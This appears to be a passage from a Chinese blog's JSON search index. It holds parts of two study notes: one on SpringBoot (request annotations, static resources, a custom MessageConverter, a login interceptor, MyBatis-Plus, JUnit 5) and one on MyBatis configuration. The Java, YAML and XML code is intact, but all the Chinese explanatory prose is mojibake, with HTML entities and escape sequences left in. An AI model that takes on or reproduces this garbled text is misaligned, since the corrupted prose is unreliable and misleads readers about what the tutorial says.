@RequestHeader(\u0026#34;User-Agent\u0026#34;) String userAgent, @RequestHeader Map\u0026lt;String,String\u0026gt; header, @RequestParam(\u0026#34;age\u0026#34;) Integer age, @RequestParam(\u0026#34;inters\u0026#34;) List\u0026lt;String\u0026gt; inters, @RequestParam Map\u0026lt;String,String\u0026gt; params, @CookieValue(\u0026#34;_ga\u0026#34;) String _ga, @CookieValue(\u0026#34;_ga\u0026#34;) Cookie cookie){ 3 èµ„æºæ”¾ç½® é™æ€èµ„æºç›®å½•\nåªè¦é™æ€èµ„æºæ”¾åœ¨ç±»è·¯å¾„ä¸‹ï¼š called /static(or/publicor/resourcesor/META-INF/resources`\nè®¿é—® ï¼š å½“å‰é¡¹ç›®æ ¹è·¯å¾„/ + é™æ€èµ„æºå\nåŸç†ï¼š é™æ€æ˜ å°„/**ã€‚\nè¯·æ±‚è¿›æ¥ï¼Œå…ˆå»æ‰¾Controllerçœ‹èƒ½ä¸èƒ½å¤„ç†ã€‚ä¸èƒ½å¤„ç†çš„æ‰€æœ‰è¯·æ±‚åˆéƒ½äº¤ç»™é™æ€èµ„æºå¤„ç†å™¨ã€‚é™æ€èµ„æºä¹Ÿæ‰¾ä¸åˆ°åˆ™å“åº”404é¡µé¢ é…ç½®æ–‡ä»¶ä¿®æ”¹\n1 2 3 4 5 6 spring: mvc: static-path-pattern: /res/** # è¡¨ç¤ºwebè®¿é—®é™æ€èµ„æºçš„è·¯å¾„ resources: static-locations: [classpath:/haha/] # è¡¨ç¤ºé™æ€èµ„æºæœåŠ¡å™¨ç«¯è®¿é—®çš„è·¯å¾„ è‡ªå®šä¹‰ Favicon\nè¿™ä¸ªåªéœ€è¦å°†å›¾ç‰‡å‘½åä¸ºfavicon.ico ï¼Œå°†å…¶æ”¾ç½®åœ¨é™æ€èµ„æºè·¯å¾„ä¸‹å³å¯ 4 å¼‚å¸¸å¤„ç† é»˜è®¤è§„åˆ™ é»˜è®¤æƒ…å†µä¸‹ï¼ŒSpring Bootæä¾›/errorå¤„ç†æ‰€æœ‰é”™è¯¯çš„æ˜ å°„ å¯¹äºæœºå™¨å®¢æˆ·ç«¯ï¼Œå®ƒå°†ç”ŸæˆJSONå“åº”ï¼Œå…¶ä¸­åŒ…å«é”™è¯¯ï¼ŒHTTPçŠ¶æ€å’Œå¼‚å¸¸æ¶ˆæ¯çš„è¯¦ç»†ä¿¡æ¯ã€‚å¯¹äºæµè§ˆå™¨å®¢æˆ·ç«¯ï¼Œå“åº”ä¸€ä¸ªâ€œ whitelabelâ€é”™è¯¯è§†å›¾ï¼Œä»¥HTMLæ ¼å¼å‘ˆç°ç›¸åŒçš„æ•°æ® 5 å¸¸è§ç»„ä»¶å¼•å…¥ å¼•å…¥json å¯¼å…¥jsonä¾èµ–\n1 2 3 4 5 6 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-json\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.4.RELEASE\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; å¯¼å…¥è¿™ä¸ªåŒ…ï¼Œè¿”å›çš„å€¼å¦‚æœä¸ºè‡ªå®šä¹‰çš„pojoç±»å‹ï¼Œåˆ™å®¹å™¨å¯ä»¥å°†å…¶å¤„ç†ä¸ºjsonä¹‹åè¿”å›ç»™å®¢æˆ·ç«¯\nå…·ä½“å®ç°æµç¨‹ä»¥åæœ‰æ—¶é—´å†å…·ä½“åˆ†æ æ•´åˆMybatis å¯¼å…¥ä¾èµ–\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.25\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.baomidou\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-plus-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; mybatis-pluså®é™…ä¸Šå·²ç»æ•´åˆäº†mybatisä¾èµ–\né…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®\né…ç½®æ•°æ®åº“\n1 2 3 4 5 6 7 8 9 spring: datasource: url: jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;serverTimezone=UTC\u0026amp;rewriteBatchedStatements=true username: root password: root driver-class-name: com.mysql.cj.jdbc.Driver jdbc: template: query-timeout: 1000 SqlSessionFactory è‡ªåŠ¨é…ç½®å¥½ã€‚åº•å±‚æ˜¯å®¹å™¨ä¸­é»˜è®¤çš„æ•°æ®æº\nmapperLocations è‡ªåŠ¨é…ç½®å¥½çš„ã€‚\næœ‰é»˜è®¤å€¼ã€‚ classpath*:/mapper/**/*.xmlï¼›ä»»æ„åŒ…çš„ç±»è·¯å¾„ä¸‹çš„æ‰€æœ‰mapperæ–‡ä»¶å¤¹ä¸‹ä»»æ„è·¯å¾„ä¸‹çš„æ‰€æœ‰xmléƒ½æ˜¯sqlæ˜ å°„æ–‡ä»¶ã€‚ å»ºè®®ä»¥åsqlæ˜ å°„æ–‡ä»¶ï¼Œæ”¾åœ¨ mapperä¸‹ å•å…ƒæµ‹è¯• ä¾èµ–å¯¼å…¥\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; ä½¿ç”¨é…ç½®éœ€è¦æ ‡æ³¨æ³¨è§£@SpringBootTest\n1 2 3 4 5 6 7 @SpringBootTest class WebAdminApplicationTests { @Test void contextLoads() { } } å¸¸ç”¨æ³¨è§£\n**@Test :**è¡¨ç¤ºæ–¹æ³•æ˜¯æµ‹è¯•æ–¹æ³•ã€‚ä½†æ˜¯ä¸JUnit4çš„@Testä¸åŒï¼Œä»–çš„èŒè´£éå¸¸å•ä¸€ä¸èƒ½å£°æ˜ä»»ä½•å±æ€§ï¼Œæ‹“å±•çš„æµ‹è¯•å°†ä¼šç”±Jupiteræä¾›é¢å¤–æµ‹è¯• **@ParameterizedTest :**è¡¨ç¤ºæ–¹æ³•æ˜¯å‚æ•°åŒ–æµ‹è¯•ï¼Œä¸‹æ–¹ä¼šæœ‰è¯¦ç»†ä»‹ç» **@RepeatedTest :**è¡¨ç¤ºæ–¹æ³•å¯é‡å¤æ‰§è¡Œï¼Œä¸‹æ–¹ä¼šæœ‰è¯¦ç»†ä»‹ç» **@DisplayName :**ä¸ºæµ‹è¯•ç±»æˆ–è€…æµ‹è¯•æ–¹æ³•è®¾ç½®å±•ç¤ºåç§° **@BeforeEach :**è¡¨ç¤ºåœ¨æ¯ä¸ªå•å…ƒæµ‹è¯•ä¹‹å‰æ‰§è¡Œ **@AfterEach :**è¡¨ç¤ºåœ¨æ¯ä¸ªå•å…ƒæµ‹è¯•ä¹‹åæ‰§è¡Œ **@BeforeAll :**è¡¨ç¤ºåœ¨æ‰€æœ‰å•å…ƒæµ‹è¯•ä¹‹å‰æ‰§è¡Œ **@AfterAll :**è¡¨ç¤ºåœ¨æ‰€æœ‰å•å…ƒæµ‹è¯•ä¹‹åæ‰§è¡Œ **@Tag :**è¡¨ç¤ºå•å…ƒæµ‹è¯•ç±»åˆ«ï¼Œç±»ä¼¼äºJUnit4ä¸­çš„@Categories **@Disabled :**è¡¨ç¤ºæµ‹è¯•ç±»æˆ–æµ‹è¯•æ–¹æ³•ä¸æ‰§è¡Œï¼Œç±»ä¼¼äºJUnit4ä¸­çš„@Ignore **@Timeout :**è¡¨ç¤ºæµ‹è¯•æ–¹æ³•è¿è¡Œå¦‚æœè¶…è¿‡äº†æŒ‡å®šæ—¶é—´å°†ä¼šè¿”å›é”™è¯¯ **@ExtendWith :**ä¸ºæµ‹è¯•ç±»æˆ–æµ‹è¯•æ–¹æ³•æä¾›æ‰©å±•ç±»å¼•ç”¨ ç®€å•æ–­è¨€\nç”¨æ¥å¯¹å•ä¸ªå€¼è¿›è¡Œç®€å•çš„éªŒè¯ã€‚å¦‚ï¼š\næ–¹æ³• è¯´æ˜ assertEquals åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æˆ–ä¸¤ä¸ªåŸå§‹ç±»å‹æ˜¯å¦ç›¸ç­‰ assertNotEquals åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æˆ–ä¸¤ä¸ªåŸå§‹ç±»å‹æ˜¯å¦ä¸ç›¸ç­‰ assertSame åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡å¼•ç”¨æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ assertNotSame åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡å¼•ç”¨æ˜¯å¦æŒ‡å‘ä¸åŒçš„å¯¹è±¡ assertTrue åˆ¤æ–­ç»™å®šçš„å¸ƒå°”å€¼æ˜¯å¦ä¸º true assertFalse åˆ¤æ–­ç»™å®šçš„å¸ƒå°”å€¼æ˜¯å¦ä¸º false assertNull åˆ¤æ–­ç»™å®šçš„å¯¹è±¡å¼•ç”¨æ˜¯å¦ä¸º null assertNotNull åˆ¤æ–­ç»™å®šçš„å¯¹è±¡å¼•ç”¨æ˜¯å¦ä¸ä¸º null 6 è‡ªå®šä¹‰ æ ‡æ³¨ä¸€ä¸ªç±»ä¸ºconfiguration ç„¶ååœ¨é‡Œé¢é‡å†™WebMvcConfigureç»„ä»¶ éœ€è¦é‡å†™å“ªä¸ªåŠŸèƒ½ç›´æ¥å®ç°é‡å†™å“ªä¸ªç»„ä»¶ï¼Œæ²¡æœ‰è¢«é‡å†™çš„ç»„ä»¶ç»§ç»­ä½¿ç”¨springbooté»˜è®¤æä¾›çš„ç»„ä»¶ å¦‚æœåŠ å…¥æ³¨è§£@EnableWebMvc é‚£ä¹ˆæ‰€æœ‰çš„ç»„ä»¶éƒ½éœ€è¦é‡å†™ï¼Œä¸é‡å†™ç­‰åŒäºæ²¡æœ‰ä½œç”¨ åœºæ™¯starter - xxxxAutoConfiguration - å¯¼å…¥xxxç»„ä»¶ - ç»‘å®šxxxProperties \u0026ndash; ç»‘å®šé…ç½®æ–‡ä»¶é¡¹ è‡ªå®šä¹‰ MessageConverter å®ç°å¤šåè®®æ•°æ®å…¼å®¹ã€‚jsonã€xmlã€x-reus\n0ã€**@ResponseBody å“åº”æ•°æ®å‡ºå» è°ƒç”¨ RequestResponseBodyMethodProcessor å¤„ç† 1ã€Processor å¤„ç†æ–¹æ³•è¿”å›å€¼ã€‚é€šè¿‡ MessageConverter å¤„ç† 2ã€æ‰€æœ‰ MessageConverter åˆèµ·æ¥å¯ä»¥æ”¯æŒå„ç§åª’ä½“ç±»å‹æ•°æ®çš„æ“ä½œï¼ˆè¯»ã€å†™ï¼‰ 3ã€å†…å®¹åå•†æ‰¾åˆ°æœ€ç»ˆçš„ messageConverterï¼› é¦–å…ˆéœ€è¦å®ç°è‡ªå®šä¹‰çš„messageConverterï¼Œç»§æ‰¿HttpMessageConverå³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class ReusMessageConverter implements HttpMessageConverter\u0026lt;Person\u0026gt; { @Override public boolean canRead(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return false; } @Override public boolean canWrite(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return clazz.isAssignableFrom(Person.class); } @Override public List\u0026lt;MediaType\u0026gt; getSupportedMediaTypes() { return MediaType.parseMediaTypes(\u0026#34;application/x-reus\u0026#34;); } @Override public Person read(Class\u0026lt;? extends Person\u0026gt; clazz, HttpInputMessage inputMessage) throws IOException, HttpMessageNotReadableException { return null; } @Override public void write(Person person, MediaType contentType, HttpOutputMessage outputMessage) throws IOException, HttpMessageNotWritableException { // è‡ªå®šä¹‰æ•°æ® String data = person.getUserName()+\u0026#34;;\u0026#34;+person.getAge()+\u0026#34;;\u0026#34;+person.getBirth(); // å†™å‡ºå» OutputStream body = outputMessage.getBody(); body.write(data.getBytes()); } } ç„¶ååœ¨æˆ‘ä»¬çš„WebMvcConfigureä¸­æ·»åŠ æˆ‘ä»¬çš„ç»„ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @Bean public WebMvcConfigurer webMvcConfigurer(){ return new WebMvcConfigurer() { /** * è‡ªå®šä¹‰å†…å®¹åå•†ç­–ç•¥ * @param configurer */ @Override public void configureContentNegotiation(ContentNegotiationConfigurer configurer) { //Map\u0026lt;String, MediaType\u0026gt; mediaTypes Map\u0026lt;String, MediaType\u0026gt; mediaTypes = new HashMap\u0026lt;\u0026gt;(); mediaTypes.put(\u0026#34;json\u0026#34;,MediaType.APPLICATION_JSON); mediaTypes.put(\u0026#34;xml\u0026#34;,MediaType.APPLICATION_XML); mediaTypes.put(\u0026#34;gg\u0026#34;,MediaType.parseMediaType(\u0026#34;application/x-reus\u0026#34;)); //æŒ‡å®šæ”¯æŒè§£æå“ªäº›å‚æ•°å¯¹åº”çš„å“ªäº›åª’ä½“ç±»å‹ ParameterContentNegotiationStrategy parameterStrategy = new ParameterContentNegotiationStrategy(mediaTypes); // parameterStrategy.setParameterName(\u0026#34;ff\u0026#34;); HeaderContentNegotiationStrategy headeStrategy = new HeaderContentNegotiationStrategy(); configurer.strategies(Arrays.asList(parameterStrategy,headeStrategy)); } // æ·»åŠ æˆ‘ä»¬è‡ªå®šä¹‰çš„MessageConverter @Override public void extendMessageConverters(List\u0026lt;HttpMessageConverter\u0026lt;?\u0026gt;\u0026gt; converters) { converters.add(new ReusMessageConverter()); } } } è‡ªå®šä¹‰æ‹¦æˆªå™¨ ä»¥è¿™ä¸ªæ£€æµ‹ç™»å½•çš„æ‹¦æˆªå™¨ä¸ºä¾‹\nå…ˆåŸºäºHandlerInterceptoræ¥å£ç¼–å†™è‡ªå·±çš„ç™»å½•æ‹¦æˆªå™¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 public class LoginInterceptor implements HandlerInterceptor { /** * ç›®æ ‡æ–¹æ³•æ‰§è¡Œä¹‹å‰ * @param request * @param response * @param handler * @return * @throws Exception */ @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String requestURI = request.getRequestURI(); log.info(\u0026#34;preHandleæ‹¦æˆªçš„è¯·æ±‚è·¯å¾„æ˜¯{}\u0026#34;,requestURI); //ç™»å½•æ£€æŸ¥é€»è¾‘ HttpSession session = request.getSession(); Object loginUser = session.getAttribute(\u0026#34;loginUser\u0026#34;); if(loginUser != null){ //æ”¾è¡Œ return true; } //æ‹¦æˆªä½ã€‚æœªç™»å½•ã€‚è·³è½¬åˆ°ç™»å½•é¡µ request.setAttribute(\u0026#34;msg\u0026#34;,\u0026#34;è¯·å…ˆç™»å½•\u0026#34;); // re.sendRedirect(\u0026#34;/\u0026#34;); request.getRequestDispatcher(\u0026#34;/\u0026#34;).forward(request,response); return false; } /** * ç›®æ ‡æ–¹æ³•æ‰§è¡Œå®Œæˆä»¥å * @param request * @param response * @param handler * @param modelAndView * @throws Exception */ @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { log.info(\u0026#34;postHandleæ‰§è¡Œ{}\u0026#34;,modelAndView); } /** * é¡µé¢æ¸²æŸ“ä»¥å * @param request * @param response * @param handler * @param ex * @throws Exception */ @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { log.info(\u0026#34;afterCompletionæ‰§è¡Œå¼‚å¸¸{}\u0026#34;,ex); } } ç„¶åç»§æ‰¿WebMvcConfigure\n1 2 3 4 5 6 @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new LoginInterceptor()) .addPathPatterns(\u0026#34;/**\u0026#34;) //æ‰€æœ‰è¯·æ±‚éƒ½è¢«æ‹¦æˆªåŒ…æ‹¬é™æ€èµ„æº .excludePathPatterns(\u0026#34;/\u0026#34;,\u0026#34;/login\u0026#34;,\u0026#34;/css/**\u0026#34;,\u0026#34;/fonts/**\u0026#34;,\u0026#34;/images/**\u0026#34;,\u0026#34;/js/**\u0026#34;); } 7 å¼€å‘æŠ€å·§ Lombok åŠ å…¥ä¾èµ–\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; è¯¥ä¾èµ–åŒ…çš„ä½œç”¨æ˜¯æ”¾åˆ°åˆ›å»ºçš„å¯¹è±¡ä¸­ï¼Œå‡å°‘äº†ä»£ç çš„å¤ç”¨ã€‚\n@NoArgsConstructor : æ— å‚æ•°æ„é€  @AllArgsConstructor ï¼š å…¨å‚æ•°æ„é€  @Data ï¼š æä¾›getå’Œsetæ–¹æ³• @ToString ï¼š æä¾›toString @EqualsAndHashCode Spring Initailizrï¼ˆé¡¹ç›®åˆå§‹åŒ–å‘å¯¼ï¼‰ è¿™ä¸ªæ˜¯IEDAæä¾›çš„ åœ¨æ–°å»ºmoduleçš„æ—¶å€™ï¼Œé€‰æ‹©Spring Initializr é€‰æ‹©æˆ‘ä»¬éœ€è¦åŠ å…¥çš„ç»„ä»¶å³å¯ spring-boot-configuration-processor è¿™ä¸ªä¾èµ–åŒ…åŠ å…¥åï¼Œå¯ä»¥æ”¯æŒå¯¹application.yamlé…ç½®æ–‡ä»¶çš„æç¤ºåŠŸèƒ½ï¼Œä¾¿äºç¼–å†™ã€‚ Mybatis plus è¿™ä¸ªç®€åŒ–äº†mapperæ¥å£å’Œxmlçš„åˆ›å»ºå’Œç®€å•å¢åˆ æ”¹æŸ¥çš„å®ç° åªéœ€è¦é€‰ä¸­å¯¹åº”çš„æ•°æ®åº“ ç‚¹å‡»mybatisx-generator,é€‰æ‹©ç›¸å…³é…ç½®å³å¯ã€‚ å¯¹åº”çš„ç®€å•å¢åˆ æ”¹æŸ¥å¯ä»¥ç»§æ‰¿BaseMapper\u0026lt;class\u0026gt;ç±»ä¸­çš„æ–¹æ³•æ¥å®ç° ","permalink":"http://www.reus09.top/posts/tech/springboot/","summary":"å› ä¸ºä¹‹å‰æ¥è§¦äº†ä¸€ç‚¹ssmï¼Œæ‰€ä»¥è¿™é‡Œç®€å•çš„å­¦ä¹ äº†springbootçš„ä¸€äº›ç®€å•ç”¨æ³•ï¼Œå…·ä½“çš„æºç åˆ†æä»¥åæœ‰æ—¶é—´çš„è¯æ…¢æ…¢åˆ†æ è¿™é‡Œç®€å•è°ˆä¸€ä¸‹spri","title":"SpringBoot"},{"content":"MyBatis è¿™é‡Œæ•´ç†äº†MyBatisçš„å¸¸è§ç”¨æ³• Mybatis ä¸»è¦å¯¹æ•°æ®åº“çš„æ“ä½œæä¾›äº†ç»„ä»¶ 1 ç¯å¢ƒæ­å»º å¯¼å…¥ä¾èµ–\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatisæ ¸å¿ƒ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQLé©±åŠ¨ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åˆ›å»ºMyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶\nmybatis-config.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE configuration PUBLIC \u0026#34;-//mybatis.org//DTD Config 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-config.dtd\u0026#34;\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;!-- æ ¸å¿ƒé…ç½®æ–‡ä»¶ä¸­çš„æ ‡ç­¾å¿…é¡»æŒ‰ç…§å›ºå®šçš„é¡ºåº(æœ‰çš„æ ‡ç­¾å¯ä»¥ä¸å†™ï¼Œä½†é¡ºåºä¸€å®šä¸èƒ½ä¹±)ï¼š propertiesã€settingsã€typeAliasesã€ typeHandlersã€objectFactoryã€ objectWrapperFactoryã€reflectorFactoryã€ pluginsã€environmentsã€databaseIdProviderã€ mappers --\u0026gt; \u0026lt;!-- å¼•å…¥ jdbcçš„é…ç½®æ–‡ä»¶ --\u0026gt; \u0026lt;properties resource=\u0026#34;jdbc.properties\u0026#34;/\u0026gt; \u0026lt;!-- è®¾ç½®Mybatis çš„å…¨å±€é…ç½®--\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;!--å°†è¡¨ä¸­å­—æ®µçš„ä¸‹åˆ’çº¿è‡ªåŠ¨è½¬æ¢ä¸ºé©¼å³°--\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!--å¼€å¯å»¶è¿ŸåŠ è½½--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;!-- è®¾ç½®ç±»å‹åˆ«å--\u0026gt; \u0026lt;typeAliases\u0026gt; \u0026lt;!--typeAlias è®¾ç½®ç±»å‹åˆ«å type alias : è®¾ç½®æŸä¸ªç±»å‹çš„åˆ«åï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå›ºå®šçš„ç±»å --\u0026gt; \u0026lt;!-- \u0026lt;typeAlias type=\u0026#34;com.reus.mybatis.pojo.User\u0026#34; alias = \u0026#34;User\u0026#34;\u0026gt;\u0026lt;/typeAlias\u0026gt;--\u0026gt; \u0026lt;!-- ä»¥åŒ…ä¸ºå•ä½ ï¼Œå°†åŒ…ä¸‹çš„æ‰€æœ‰æ•°æ®è®¾ç½®ä¸ºé»˜è®¤çš„ç±»å‹åˆ«åï¼Œå³ç±»åä¸åŒºåˆ†å¸¦å¤§å°å†™ --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.pojo\u0026#34;/\u0026gt; \u0026lt;/typeAliases\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!--è®¾ç½®åˆ†é¡µæ’ä»¶--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;!-- environments:é…ç½®å¤šä¸ª æ•°æ®åº“çš„ç¯å¢ƒ å±æ€§ï¼š default: é»˜è®¤ä½¿ç”¨çš„ç¯å¢ƒçš„Id --\u0026gt; \u0026lt;environments default=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- é…ç½®å…·ä½“çš„ç¯å¢ƒ å±æ€§: id, å”¯ä¸€æ ‡è¯† asd --\u0026gt; \u0026lt;environment id=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- transactionManager: è®¾ç½®äº‹åŠ¡ç®¡ç†æ–¹å¼ JDBC å½“å‰ç¯å¢ƒæ‰§è¡Œsqlæ—¶ï¼Œä½¿ç”¨JDBCåŸç”Ÿçš„äº‹åŠ¡ç®¡ç†æ–¹å¼ï¼Œäº‹åŠ¡çš„æäº¤å’Œå›æ»šéœ€è¦æ‰‹åŠ¨å¤„ç† MANAGED ï¼š è¢«Springç®¡ç† --\u0026gt; \u0026lt;transactionManager type=\u0026#34;JDBC\u0026#34;/\u0026gt; \u0026lt;!--åˆ¶å®š æ•°æ®æº Type: æ•°æ®ç±»å‹ POOLED æ•°æ®åº“ä½¿ç”¨ç¼“å­˜æ•°æ®åº“è¿æ¥ UNPOOLED ä¸ä½¿ç”¨æ•°æ®åº“è¿æ¥æ±  JNDI ä½¿ç”¨ä¸Šä¸‹æ–‡ä¸­çš„æ•°æ®æº --\u0026gt; \u0026lt;dataSource type=\u0026#34;POOLED\u0026#34;\u0026gt; \u0026lt;property name=\u0026#34;driver\u0026#34; value=\u0026#34;${jdbc.driver}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;url\u0026#34; value=\u0026#34;${jdbc.url}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;username\u0026#34; value=\u0026#34;${jdbc.username}\u0026#34;/\u0026gt; \u0026lt;property name=\u0026#34;password\u0026#34; value=\u0026#34;${jdbc.password}\u0026#34;/\u0026gt; \u0026lt;/dataSource\u0026gt; \u0026lt;/environment\u0026gt; \u0026lt;/environments\u0026gt; \u0026lt;!--å¼•å…¥æ˜ å°„æ–‡ä»¶--\u0026gt; \u0026lt;mappers\u0026gt; \u0026lt;!-- \u0026lt;mapper resource=\u0026#34;mappers/UserMapper.xml\u0026#34;/\u0026gt;--\u0026gt; \u0026lt;!-- ä»¥åŒ…ä¸ºå•ä½å¼•å…¥æ˜ å°„æ–‡ä»¶ è¦æ±‚ 1ã€mapperæ¥å£æ‰€åœ¨çš„åŒ…è¦å’Œæ˜ å°„æ–‡ä»¶æ‰€åœ¨çš„åŒ…ä¸€è‡´ 2ã€mapperæ¥å£è¦å’Œæ˜ å°„æ–‡ä»¶çš„åå­—ä¸€è‡´ --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.mapper\u0026#34;/\u0026gt; \u0026lt;/mappers\u0026gt; \u0026lt;/configuration\u0026gt; 2 å…·ä½“é…ç½®åŠè°ƒç”¨ åˆ›å»ºmapperæ¥å£\nMyBatisä¸­çš„mapperæ¥å£ç›¸å½“äºä»¥å‰çš„daoã€‚ä½†æ˜¯åŒºåˆ«åœ¨äºï¼Œmapperä»…ä»…æ˜¯æ¥å£ï¼Œæˆ‘ä»¬ä¸éœ€è¦æä¾›å®ç°ç±»\n1 2 3 4 5 6 7 8 package com.reus.mybatis.mapper; public interface UserMapper { /** * æ·»åŠ ç”¨æˆ·ä¿¡æ¯ */ int insertUser(); } åˆ›å»ºå¯¹åº”çš„Mybatisæ˜ å°„æ–‡ä»¶\nç›¸å…³æ¦‚å¿µï¼šORMï¼ˆObject Relationship Mappingï¼‰å¯¹è±¡å…³ç³»æ˜ å°„ã€‚ å¯¹è±¡ï¼šJavaçš„å®ä½“ç±»å¯¹è±¡ å…³ç³»ï¼šå…³ç³»å‹æ•°æ®åº“ æ˜ å°„ï¼šäºŒè€…ä¹‹é—´çš„å¯¹åº”å…³ç³» Javaæ¦‚å¿µ æ•°æ®åº“æ¦‚å¿µ ç±» è¡¨ å±æ€§ å­—æ®µ/åˆ— å¯¹è±¡ è®°å½•/è¡Œ æ˜ å°„æ–‡ä»¶çš„å‘½åè§„åˆ™ è¡¨æ‰€å¯¹åº”çš„å®ä½“ç±»çš„ç±»å+Mapper.xml ä¾‹å¦‚ï¼šè¡¨t_userï¼Œæ˜ å°„çš„å®ä½“ç±»ä¸ºUserï¼Œæ‰€å¯¹åº”çš„æ˜ å°„æ–‡ä»¶ä¸ºUserMapper.xml å› æ­¤ä¸€ä¸ªæ˜ å°„æ–‡ä»¶å¯¹åº”ä¸€ä¸ªå®ä½“ç±»ï¼Œå¯¹åº”ä¸€å¼ è¡¨çš„æ“ä½œ MyBatisæ˜ å°„æ–‡ä»¶ç”¨äºç¼–å†™SQLï¼Œè®¿é—®ä»¥åŠæ“ä½œè¡¨ä¸­çš„æ•°æ® MyBatisæ˜ å°„æ–‡ä»¶å­˜æ”¾çš„ä½ç½®æ˜¯src/main/resources/mappersç›®å½•ä¸‹ MyBatisä¸­å¯ä»¥é¢å‘æ¥å£æ“ä½œæ•°æ®ï¼Œè¦ä¿è¯ä¸¤ä¸ªä¸€è‡´ mapperæ¥å£çš„å…¨ç±»åå’Œæ˜ å°„æ–‡ä»¶çš„å‘½åç©ºé—´ï¼ˆnamespaceï¼‰ä¿æŒä¸€è‡´ mapperæ¥å£ä¸­æ–¹æ³•çš„æ–¹æ³•åå’Œæ˜ å°„æ–‡ä»¶ä¸­ç¼–å†™SQLçš„æ ‡ç­¾çš„idå±æ€§ä¿æŒä¸€è‡´ 1 2 3 4 5 6 7 8 9 10 11 12 